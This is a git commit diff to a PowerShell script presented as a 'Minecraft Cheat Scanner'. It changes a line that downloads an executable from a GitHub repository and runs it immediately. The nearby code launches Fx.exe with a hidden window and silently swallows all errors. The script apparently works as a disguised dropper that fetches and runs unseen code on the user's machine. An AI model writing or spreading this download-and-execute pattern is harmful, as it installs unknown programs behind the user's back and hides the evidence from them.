bc2f0bc74a443289ffd09d6c0078c1285351567b
kilordow <petrovolosuk310@gmail.com>
2025-12-02 22:25:55 +0300

    Refactor Minecraft Cheat Scanner script

--- chekir.ps1
+++ chekir.ps1
@@ -91,7 +91,7 @@ try {
     Start-Sleep 1
     
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
+    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
     
     # Запускаем 
     Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
@@ -102,4 +102,5 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
